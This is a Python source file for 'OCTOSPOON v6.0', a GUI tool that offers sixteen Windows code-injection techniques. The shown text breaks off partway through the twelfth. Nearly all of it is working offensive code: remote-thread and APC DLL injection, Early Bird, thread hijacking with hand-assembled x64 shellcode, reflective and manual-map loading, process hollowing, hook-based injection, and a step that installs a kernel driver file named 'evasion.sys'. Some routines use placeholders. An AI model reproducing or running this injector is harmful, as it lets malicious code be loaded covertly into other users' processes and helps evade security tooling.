# octospoon_gui.py - OCTOSPOON v6.0 FULL GUI + 16 INJECTION METHODS
import sys
import os
import ctypes
import struct
import subprocess
import psutil
import time
from ctypes import wintypes, windll, POINTER, sizeof, c_void_p, c_char, byref
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QComboBox, QPushButton, QTextEdit, QFileDialog,
    QListWidget, QSplitter, QMessageBox, QProgressBar, QCheckBox
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont

# Define missing wintypes attributes
wintypes.ULONG64 = ctypes.c_ulonglong
wintypes.LONG64 = ctypes.c_longlong
wintypes.ULONG_PTR = ctypes.c_ulonglong
wintypes.LONG_PTR = ctypes.c_longlong
wintypes.DWORD64 = ctypes.c_ulonglong

# Add more missing wintypes
wintypes.ACCESS_MASK = ctypes.c_ulong
wintypes.LPVOID = ctypes.c_void_p
wintypes.LPCVOID = ctypes.c_void_p
wintypes.LPCWSTR = ctypes.c_wchar_p
wintypes.LPWSTR = ctypes.c_wchar_p
wintypes.LPBYTE = ctypes.POINTER(ctypes.c_byte)
wintypes.HMODULE = wintypes.HANDLE
wintypes.HINSTANCE = wintypes.HANDLE
wintypes.HHOOK = wintypes.HANDLE
wintypes.ATOM = wintypes.WORD
wintypes.WPARAM = ctypes.c_ulonglong
wintypes.LPARAM = ctypes.c_longlong
wintypes.UINT = ctypes.c_uint

# === WinAPI Constants ===
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
user32 = windll.user32

PROCESS_ALL_ACCESS = 0x1F0FFF
THREAD_ALL_ACCESS = 0x1F03FF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
INFINITE = 0xFFFFFFFF
CREATE_SUSPENDED = 0x00000004
CONTEXT_FULL = 0x10007
SECTION_ALL_ACCESS = 0x000F0000 | 0x001F0000 | 0x0001
FILE_MAP_WRITE = 0x0002
FILE_MAP_READ = 0x0004
INVALID_HANDLE_VALUE = wintypes.HANDLE(-1).value
HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
HEAP_ZERO_MEMORY = 0x00000008

# === Structures ===
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("P1Home", ctypes.c_ulonglong),
        ("P2Home", ctypes.c_ulonglong),
        ("P3Home", ctypes.c_ulonglong),
        ("P4Home", ctypes.c_ulonglong),
        ("P5Home", ctypes.c_ulonglong),
        ("P6Home", ctypes.c_ulonglong),
        ("ContextFlags", wintypes.DWORD),
        ("MxCsr", wintypes.DWORD),
        ("SegCs", wintypes.WORD),
        ("SegDs", wintypes.WORD),
        ("SegEs", wintypes.WORD),
        ("SegFs", wintypes.WORD),
        ("SegGs", wintypes.WORD),
        ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        ("Dr0", ctypes.c_ulonglong),
        ("Dr1", ctypes.c_ulonglong),
        ("Dr2", ctypes.c_ulonglong),
        ("Dr3", ctypes.c_ulonglong),
        ("Dr6", ctypes.c_ulonglong),
        ("Dr7", ctypes.c_ulonglong),
        ("Rax", ctypes.c_ulonglong),
        ("Rcx", ctypes.c_ulonglong),
        ("Rdx", ctypes.c_ulonglong),
        ("Rbx", ctypes.c_ulonglong),
        ("Rsp", ctypes.c_ulonglong),
        ("Rbp", ctypes.c_ulonglong),
        ("Rsi", ctypes.c_ulonglong),
        ("Rdi", ctypes.c_ulonglong),
        ("R8", ctypes.c_ulonglong),
        ("R9", ctypes.c_ulonglong),
        ("R10", ctypes.c_ulonglong),
        ("R11", ctypes.c_ulonglong),
        ("R12", ctypes.c_ulonglong),
        ("R13", ctypes.c_ulonglong),
        ("R14", ctypes.c_ulonglong),
        ("R15", ctypes.c_ulonglong),
        ("Rip", ctypes.c_ulonglong),
    ]

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", wintypes.LPWSTR),
    ]

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.ULONG),
        ("RootDirectory", wintypes.HANDLE),
        ("ObjectName", POINTER(UNICODE_STRING)),
        ("Attributes", wintypes.ULONG),
        ("SecurityDescriptor", c_void_p),
        ("SecurityQualityOfService", c_void_p),
    ]

class CLIENT_ID(ctypes.Structure):
    _fields_ = [
        ("UniqueProcess", wintypes.HANDLE),
        ("UniqueThread", wintypes.HANDLE),
    ]
# === WINAPI Function Setup ===
# Kernel32 Functions
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.OpenProcess.restype = wintypes.HANDLE

kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAllocEx.restype = wintypes.LPVOID

kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = wintypes.BOOL

kernel32.ReadProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID, ctypes.c_size_t, POINTER(ctypes.c_size_t)]
kernel32.ReadProcessMemory.restype = wintypes.BOOL

kernel32.CreateRemoteThread.argtypes = [wintypes.HANDLE, c_void_p, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, POINTER(wintypes.DWORD)]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE

kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
kernel32.WaitForSingleObject.restype = wintypes.DWORD

kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL

kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
kernel32.GetModuleHandleW.restype = wintypes.HMODULE

kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
kernel32.GetProcAddress.restype = wintypes.LPVOID

kernel32.GetCurrentProcess.restype = wintypes.HANDLE

kernel32.OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.OpenThread.restype = wintypes.HANDLE

kernel32.QueueUserAPC.argtypes = [wintypes.LPVOID, wintypes.HANDLE, ctypes.c_ulonglong]
kernel32.QueueUserAPC.restype = wintypes.DWORD

kernel32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, c_void_p, c_void_p, wintypes.BOOL, wintypes.DWORD, c_void_p, wintypes.LPCWSTR, POINTER(STARTUPINFOW), POINTER(PROCESS_INFORMATION)]
kernel32.CreateProcessW.restype = wintypes.BOOL

kernel32.GetThreadContext.argtypes = [wintypes.HANDLE, POINTER(CONTEXT)]
kernel32.GetThreadContext.restype = wintypes.BOOL

kernel32.SetThreadContext.argtypes = [wintypes.HANDLE, POINTER(CONTEXT)]
kernel32.SetThreadContext.restype = wintypes.BOOL

kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
kernel32.ResumeThread.restype = wintypes.DWORD

kernel32.SuspendThread.argtypes = [wintypes.HANDLE]
kernel32.SuspendThread.restype = wintypes.DWORD

kernel32.LoadLibraryW.argtypes = [wintypes.LPCWSTR]
kernel32.LoadLibraryW.restype = wintypes.HMODULE

kernel32.FreeLibrary.argtypes = [wintypes.HMODULE]
kernel32.FreeLibrary.restype = wintypes.BOOL

kernel32.CreateFileMappingW.argtypes = [wintypes.HANDLE, c_void_p, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, wintypes.LPCWSTR]
kernel32.CreateFileMappingW.restype = wintypes.HANDLE

kernel32.MapViewOfFile.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD, ctypes.c_size_t]
kernel32.MapViewOfFile.restype = wintypes.LPVOID

kernel32.UnmapViewOfFile.argtypes = [wintypes.LPCVOID]
kernel32.UnmapViewOfFile.restype = wintypes.BOOL

kernel32.OpenFileMappingW.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.LPCWSTR]
kernel32.OpenFileMappingW.restype = wintypes.HANDLE

kernel32.HeapCreate.argtypes = [wintypes.DWORD, ctypes.c_size_t, ctypes.c_size_t]
kernel32.HeapCreate.restype = wintypes.HANDLE

kernel32.HeapAlloc.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.c_size_t]
kernel32.HeapAlloc.restype = wintypes.LPVOID

# NTDLL Functions
ntdll.NtCreateSection.argtypes = [POINTER(wintypes.HANDLE), ctypes.c_ulong, POINTER(OBJECT_ATTRIBUTES), POINTER(wintypes.LARGE_INTEGER), wintypes.ULONG, wintypes.ULONG, wintypes.HANDLE]
ntdll.NtCreateSection.restype = wintypes.LONG

ntdll.NtMapViewOfSection.argtypes = [wintypes.HANDLE, wintypes.HANDLE, POINTER(wintypes.LPVOID), wintypes.ULONG_PTR, ctypes.c_size_t, POINTER(wintypes.LARGE_INTEGER), POINTER(wintypes.ULONG), wintypes.ULONG, wintypes.ULONG, wintypes.ULONG]
ntdll.NtMapViewOfSection.restype = wintypes.LONG

ntdll.NtUnmapViewOfSection.argtypes = [wintypes.HANDLE, wintypes.LPVOID]
ntdll.NtUnmapViewOfSection.restype = wintypes.LONG

ntdll.NtCreateThreadEx.argtypes = [POINTER(wintypes.HANDLE), wintypes.ACCESS_MASK, c_void_p, wintypes.HANDLE, wintypes.LPVOID, c_void_p, wintypes.ULONG, c_void_p, c_void_p, c_void_p, c_void_p]
ntdll.NtCreateThreadEx.restype = wintypes.LONG

ntdll.RtlCreateUserThread.argtypes = [wintypes.HANDLE, c_void_p, wintypes.BOOL, wintypes.ULONG, c_void_p, c_void_p, wintypes.LPVOID, c_void_p, POINTER(wintypes.HANDLE), POINTER(CLIENT_ID)]
ntdll.RtlCreateUserThread.restype = wintypes.LONG

# PSAPI Functions
psapi.EnumProcessModules.argtypes = [wintypes.HANDLE, POINTER(wintypes.HMODULE), wintypes.DWORD, POINTER(wintypes.DWORD)]
psapi.EnumProcessModules.restype = wintypes.BOOL

# User32 Functions - Replace the existing SetWindowsHookEx section with this:
user32.SetWindowsHookExW = windll.user32.SetWindowsHookExW
user32.SetWindowsHookExW.argtypes = [ctypes.c_int, ctypes.c_void_p, wintypes.HINSTANCE, wintypes.DWORD]
user32.SetWindowsHookExW.restype = ctypes.c_void_p  # HHOOK is a pointer

user32.UnhookWindowsHookEx = windll.user32.UnhookWindowsHookEx
user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]  # HHOOK
user32.UnhookWindowsHookEx.restype = wintypes.BOOL

user32.PostThreadMessageW = windll.user32.PostThreadMessageW
user32.PostThreadMessageW.argtypes = [wintypes.DWORD, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
user32.PostThreadMessageW.restype = wintypes.BOOL


# === Shellcode Builder ===
def build_loadlibrary_shellcode(dll_path_addr, loadlib_addr, alert_addr=0):
    """Build x64 shellcode to call LoadLibraryA and optionally NtTestAlert"""
    shellcode = bytearray()
    # sub rsp, 0x28
    shellcode.extend(b'\x48\x83\xEC\x28')
    # mov rcx, dll_path
    shellcode.extend(b'\x48\xB9')
    shellcode.extend(struct.pack('<Q', dll_path_addr))
    # mov rax, LoadLibraryA
    shellcode.extend(b'\x48\xB8')
    shellcode.extend(struct.pack('<Q', loadlib_addr))
    # call rax
    shellcode.extend(b'\xFF\xD0')
    # Optional NtTestAlert
    if alert_addr:
        # mov rax, NtTestAlert
        shellcode.extend(b'\x48\xB8')
        shellcode.extend(struct.pack('<Q', alert_addr))
        # call rax
        shellcode.extend(b'\xFF\xD0')
    # add rsp, 0x28
    shellcode.extend(b'\x48\x83\xC4\x28')
    # ret
    shellcode.extend(b'\xC3')
    return bytes(shellcode)


# === Injection Worker ===
class InjectorThread(QThread):
    log_signal = pyqtSignal(str)
    done_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)

    def __init__(self, method, pid=None, dll_path=None, exe_path=None, stealth=False):
        super().__init__()
        self.method = method
        self.pid = pid
        self.dll_path = dll_path
        self.exe_path = exe_path
        self.stealth = stealth

    def log(self, msg):
        self.log_signal.emit(f"[+] {msg}")

    def error(self, msg):
        self.error_signal.emit(f"[!] {msg}")

    def run(self):
        try:
            method_name = self.method.lower().replace(' ', '_')
            # Map method names to their functions
            method_map = {
                'standard': self.standard_injection,
                'apc': self.apc_injection,
                'early_bird': self.early_bird_injection,
                'thread_hijack': self.thread_hijack_injection,
                'reflective': self.reflective_injection,
                'manual_map': self.manual_map_injection,
                'process_hollowing': self.process_hollowing_injection,
                'thread_pool': self.thread_pool_injection,
                'kernel_driver': self.kernel_driver_injection,
                'atombombing': self.atombombing_injection,
                'sethook': self.sethook_injection,
                'powerloader': self.powerloader_injection,
                'section_mapping': self.section_mapping_injection,
                'ntcreatethread': self.ntcreatethread_injection,
                'rtlcreateuserthread': self.rtlcreateuserthread_injection,
                'ntalert': self.ntalert_injection,
            }
            method_map[method_name]()
            self.done_signal.emit(f"{self.method} injection completed successfully.")
        except Exception as e:
            self.error(f"Error in {self.method}: {str(e)}")
            self.done_signal.emit(f"{self.method} injection failed.")

    # === 1. Standard CreateRemoteThread ===
    def standard_injection(self):
        self.log("Starting Standard CreateRemoteThread Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if not h_process:
            raise Exception(f"Failed to open process {self.pid}")
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        dll_path_size = len(dll_path_bytes)
        
        remote_mem = kernel32.VirtualAllocEx(h_process, None, dll_path_size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
        if not remote_mem:
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to allocate memory")
        
        bytes_written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, dll_path_size, byref(bytes_written)):
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to write DLL path")
        
        kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
        
        thread_id = wintypes.DWORD(0)
        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, remote_mem, 0, byref(thread_id))
        
        if not h_thread:
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to create remote thread")
        
        kernel32.WaitForSingleObject(h_thread, INFINITE)
        
        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
        
        self.log("Standard DLL injection completed")

    # === 2. APC Injection ===
    def apc_injection(self):
        self.log("Starting APC Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if not h_process:
            raise Exception(f"Failed to open process {self.pid}")
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        dll_path_size = len(dll_path_bytes)
        
        remote_mem = kernel32.VirtualAllocEx(h_process, None, dll_path_size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, dll_path_size, byref(bytes_written))
        
        kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
        
        queued_count = 0
        try:
            process = psutil.Process(self.pid)
            for thread in process.threads():
                h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, thread.id)
                if h_thread:
                    if kernel32.QueueUserAPC(load_library_addr, h_thread, remote_mem):
                        queued_count += 1
                    kernel32.CloseHandle(h_thread)
        except:
            pass
        
        kernel32.CloseHandle(h_process)
        self.log(f"APC queued on {queued_count} threads")

    # === 3. Early Bird Injection ===
    def early_bird_injection(self):
        self.log("Starting Early Bird APC Injection...")
        
        si = STARTUPINFOW()
        si.cb = sizeof(STARTUPINFOW)
        pi = PROCESS_INFORMATION()
        
        if not kernel32.CreateProcessW(
            self.exe_path, None, None, None, False,
            CREATE_SUSPENDED, None, None, byref(si), byref(pi)
        ):
            raise Exception("Failed to create suspended process")
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        dll_path_size = len(dll_path_bytes)
        
        remote_mem = kernel32.VirtualAllocEx(pi.hProcess, None, dll_path_size, MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(pi.hProcess, remote_mem, dll_path_bytes, dll_path_size, byref(bytes_written))
        
        kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
        
        kernel32.QueueUserAPC(load_library_addr, pi.hThread, remote_mem)
        kernel32.ResumeThread(pi.hThread)
        
        self.log("Early Bird injection completed")
        
        kernel32.CloseHandle(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)

    # === 4. Thread Hijacking ===
    def thread_hijack_injection(self):
        self.log("Starting Thread Hijacking...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if not h_process:
            raise Exception(f"Failed to open process {self.pid}")
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        remote_path = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_path, dll_path_bytes, len(dll_path_bytes), byref(bytes_written))
        
        kernel32_module = kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
        
        shellcode = build_loadlibrary_shellcode(remote_path, load_library_addr)
        
        remote_shellcode = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, remote_shellcode, shellcode, len(shellcode), byref(bytes_written))
        
        hijacked = False
        try:
            process = psutil.Process(self.pid)
            for thread in process.threads():
                h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, thread.id)
                if h_thread:
                    kernel32.SuspendThread(h_thread)
                    ctx = CONTEXT()
                    ctx.ContextFlags = CONTEXT_FULL
                    if kernel32.GetThreadContext(h_thread, byref(ctx)):
                        ctx.Rip = remote_shellcode
                        kernel32.SetThreadContext(h_thread, byref(ctx))
                        kernel32.ResumeThread(h_thread)
                        hijacked = True
                    kernel32.CloseHandle(h_thread)
                    if hijacked:
                        break
        except:
            pass
        
        kernel32.CloseHandle(h_process)
        if hijacked:
            self.log(f"Thread hijacking completed")
        else:
            raise Exception("Failed to hijack any thread")

    # === 5. Reflective DLL ===
    def reflective_injection(self):
        self.log("Starting Reflective DLL Injection...")
        
        with open(self.dll_path, 'rb') as f:
            dll_data = f.read()
        
        e_lfanew = struct.unpack_from("<I", dll_data, 0x3C)[0]
        entry_point_rva = struct.unpack_from("<I", dll_data, e_lfanew + 0x28)[0]
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        remote_base = kernel32.VirtualAllocEx(h_process, None, len(dll_data), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_base, dll_data, len(dll_data), byref(bytes_written))
        
        remote_entry = remote_base + entry_point_rva
        thread_id = wintypes.DWORD(0)
        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, remote_entry, remote_base, 0, byref(thread_id))
        
        kernel32.WaitForSingleObject(h_thread, INFINITE)
        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
        
        self.log("Reflective DLL injection completed")

    # === 6. Manual Map ===
    def manual_map_injection(self):
        self.log("Starting Manual Map Injection...")
        
        with open(self.dll_path, 'rb') as f:
            dll_data = f.read()
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        section_handle = wintypes.HANDLE(0)
        max_size = wintypes.LARGE_INTEGER(len(dll_data))
        
        status = ntdll.NtCreateSection(byref(section_handle), SECTION_ALL_ACCESS, None, byref(max_size), PAGE_EXECUTE_READWRITE, 0x8000000, None)
        if status != 0:
            kernel32.CloseHandle(h_process)
            raise Exception(f"NtCreateSection failed: 0x{status:X}")
        
        local_base = c_void_p(0)
        view_size = ctypes.c_size_t(len(dll_data))
        
        ntdll.NtMapViewOfSection(section_handle, kernel32.GetCurrentProcess(), byref(local_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
        ctypes.memmove(local_base.value, dll_data, len(dll_data))
        
        remote_base = c_void_p(0)
        ntdll.NtMapViewOfSection(section_handle, h_process, byref(remote_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
        
        ntdll.NtUnmapViewOfSection(kernel32.GetCurrentProcess(), local_base)
        kernel32.CloseHandle(section_handle)
        kernel32.CloseHandle(h_process)
        
        self.log(f"Manual map completed at 0x{remote_base.value:X}")

    # === 7. Process Hollowing ===
    def process_hollowing_injection(self):
        self.log("Starting Process Hollowing...")
        
        with open(self.dll_path, 'rb') as f:
            pe_data = f.read()
        
        if pe_data[0:2] != b'MZ':
            raise Exception("Invalid PE file")
        
        si = STARTUPINFOW()
        si.cb = sizeof(STARTUPINFOW)
        pi = PROCESS_INFORMATION()
        
        if not kernel32.CreateProcessW(self.exe_path, None, None, None, False, CREATE_SUSPENDED, None, None, byref(si), byref(pi)):
            raise Exception("Failed to create suspended process")
        
        e_lfanew = struct.unpack_from("<I", pe_data, 0x3C)[0]
        image_base_addr = struct.unpack_from("<Q", pe_data, e_lfanew + 0x30)[0]
        size_of_image = struct.unpack_from("<I", pe_data, e_lfanew + 0x50)[0]
        size_of_headers = struct.unpack_from("<I", pe_data, e_lfanew + 0x54)[0]
        entry_point_rva = struct.unpack_from("<I", pe_data, e_lfanew + 0x28)[0]
        num_sections = struct.unpack_from("<H", pe_data, e_lfanew + 0x06)[0]
        
        ntdll.NtUnmapViewOfSection(pi.hProcess, ctypes.c_void_p(image_base_addr))
        
        new_image_base = kernel32.VirtualAllocEx(pi.hProcess, ctypes.c_void_p(image_base_addr), size_of_image, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        if not new_image_base:
            new_image_base = kernel32.VirtualAllocEx(pi.hProcess, None, size_of_image, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(pi.hProcess, new_image_base, pe_data, size_of_headers, byref(bytes_written))
        
        section_header_offset = e_lfanew + 0xF8
        for i in range(num_sections):
            section_offset = section_header_offset + (i * 40)
            virtual_address = struct.unpack_from("<I", pe_data, section_offset + 12)[0]
            size_of_raw_data = struct.unpack_from("<I", pe_data, section_offset + 16)[0]
            pointer_to_raw_data = struct.unpack_from("<I", pe_data, section_offset + 20)[0]
            
            if size_of_raw_data > 0:
                dest = new_image_base + virtual_address
                kernel32.WriteProcessMemory(pi.hProcess, dest, pe_data[pointer_to_raw_data:pointer_to_raw_data + size_of_raw_data], size_of_raw_data, byref(bytes_written))
        
        ctx = CONTEXT()
        ctx.ContextFlags = CONTEXT_FULL
        kernel32.GetThreadContext(pi.hThread, byref(ctx))
        
        new_entry = new_image_base + entry_point_rva
        ctx.Rcx = new_entry
        kernel32.SetThreadContext(pi.hThread, byref(ctx))
        
        kernel32.ResumeThread(pi.hThread)
        self.log("Process hollowing completed")
        
        kernel32.CloseHandle(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)

    # === 8. Thread Pool ===
    def thread_pool_injection(self):
        self.log("Starting Thread Pool Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        dll_bytes = self.dll_path.encode('utf-16le') + b'\x00\x00'
        remote_path = kernel32.VirtualAllocEx(h_process, None, len(dll_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_path, dll_bytes, len(dll_bytes), byref(bytes_written))
        
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryW")
        shellcode = build_loadlibrary_shellcode(remote_path, loadlib)
        
        remote_code = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, remote_code, shellcode, len(shellcode), byref(bytes_written))
        
        try:
            process = psutil.Process(self.pid)
            threads = process.threads()
            if threads:
                h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, threads[0].id)
                if h_thread:
                    kernel32.QueueUserAPC(remote_code, h_thread, 0)
                    kernel32.CloseHandle(h_thread)
        except:
            pass
        
        kernel32.CloseHandle(h_process)
        self.log("Thread pool injection completed")

    # === 9. Kernel Driver ===
    def kernel_driver_injection(self):
        self.log("Starting Kernel Driver Injection...")
        
        driver_path = os.path.abspath("drivers/evasion.sys")
        if not os.path.exists(driver_path):
            os.makedirs("drivers", exist_ok=True)
            with open(driver_path, 'wb') as f:
                f.write(b'\x00' * 1024)
            self.log("Placeholder driver created")
        
        try:
            subprocess.run(f'sc create octospoon type= kernel binPath= "{driver_path}"', shell=True, capture_output=True, text=True)
            subprocess.run('sc start octospoon', shell=True, capture_output=True, text=True)
            self.log("Driver loaded (may require test signing mode)")
        except:
            self.log("Driver requires test signing mode and admin privileges")

    # === 10. AtomBombing ===
    def atombombing_injection(self):
        self.log("Starting AtomBombing Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        
        atom_ids = []
        dll_atom = kernel32.GlobalAddAtomW(self.dll_path)
        if dll_atom:
            atom_ids.append(dll_atom)
        
        shellcode = build_loadlibrary_shellcode(0, loadlib)  # Placeholder address
        
        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, shellcode, len(shellcode), byref(bytes_written))
        
        dll_bytes = self.dll_path.encode('ascii') + b'\x00'
        dll_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        kernel32.WriteProcessMemory(h_process, dll_mem, dll_bytes, len(dll_bytes), byref(bytes_written))
        
        try:
            process = psutil.Process(self.pid)
            for thread in process.threads():
                h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, thread.id)
                if h_thread:
                    kernel32.QueueUserAPC(remote_mem, h_thread, 0)
                    kernel32.CloseHandle(h_thread)
                    break
        except:
            pass
        
        for atom_id in atom_ids:
            kernel32.GlobalDeleteAtom(atom_id)
        
        kernel32.CloseHandle(h_process)
        self.log("AtomBombing completed")

        # === 11. SetWindowsHookEx ===
    def sethook_injection(self):
        self.log("Starting SetWindowsHookEx Injection...")
        
        try:
            process = psutil.Process(self.pid)
            threads = process.threads()
            if not threads:
                raise Exception("No threads in target process")
            target_thread_id = threads[0].id
            
            dll_path = os.path.abspath(self.dll_path)
            
            # Load DLL to get module handle
            h_module = kernel32.LoadLibraryW(dll_path)
            if not h_module:
                raise Exception("Failed to load DLL in local process")
            
            # Set hook (WH_GETMESSAGE = 2)
            hook = user32.SetWindowsHookExW(2, None, h_module, target_thread_id)
            
            if hook:
                self.log("Hook set successfully")
                # Post message to trigger hook
                user32.PostThreadMessageW(target_thread_id, 0, 0, 0)
                time.sleep(1)
                user32.UnhookWindowsHookEx(hook)
            else:
                error_code = kernel32.GetLastError()
                raise Exception(f"SetWindowsHookEx failed (Error: {error_code})")
            
            kernel32.FreeLibrary(h_module)
            self.log("SetHook injection completed")
        except Exception as e:
            self.log(f"SetHook injection: {str(e)}")

    # === 12. PowerLoaderEx ===
    def powerloader_injection(self):
        self.log("Starting PowerLoaderEx Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if not h_process:
            raise Exception(f"Failed to open process {self.pid}")
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        section_name = f"Global\\PowerLoader{os.getpid()}"
        
        # Create file mapping
